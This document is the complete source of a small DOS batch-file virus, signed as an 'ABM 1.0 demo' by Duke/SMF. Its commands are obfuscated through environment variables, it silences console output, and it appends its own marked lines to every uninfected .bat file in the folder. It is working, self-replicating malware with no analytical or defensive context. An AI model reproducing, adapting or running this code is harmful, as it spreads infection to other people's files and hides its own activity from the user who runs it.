;@set dg=ctty
;@set sq=nul
;@%dg% %sq%
;@set twr=if
;@set es="%0
;@set dg="
;@set wst=goto
;@set li=;@
;@%twr% %es%==%dg% %wst% %li%
;@set dg="%1
;@set sq="@
;@set es=;@z
;@%twr% %dg%==%sq% %wst% %es%
;@set dg=echo.
;@set ewk=@.bat
;@%dg%>%ewk%
;@set vn=find
;@set ior=";@"
;@set dg=%0
;@%vn% %ior%<%dg%>>%ewk%
;@set dg=for
;@set rv=%%b
;@set sq=in
;@set es=(*.bat)
;@set no=do
;@set lu=call
;@set oo=@
;@%dg% %rv% %sq% %es% %no% %lu% %oo% %oo% %rv%
;@set dg=del
;@set sq=@.*
;@%dg% %sq%
;@%wst% %li%
:;@z [ABM 1.0 demo] by Duke/SMF
;@set st=%2
;@%vn% %ior%<%st%
;@set dg=errorlevel
;@set sq=1
;@set es=type
;@%twr% %dg% %sq% %es% %ewk%>>%st%
:;@
